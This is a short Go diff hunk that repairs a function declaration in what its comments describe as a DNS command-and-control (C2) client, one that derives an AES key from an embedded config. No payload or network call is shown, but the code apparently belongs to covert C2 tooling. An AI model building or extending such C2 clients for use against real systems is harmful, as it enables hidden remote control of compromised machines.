@@ -19,7 +19,8 @@ type DNSClient struct {
 // newDNSClient creates a new DNS C2 client with embedded config
 // newDNSClient creates a DNS client with configured timeout and resolver settings
 // for communicating with the C2 DNS server.
-fig := getConfig()
+func newDNSClient() *DNSClient {
+	config := getConfig()
 	aesKey := generateAESKey(config.EncryptionKey)
 
 	return &DNSClient{
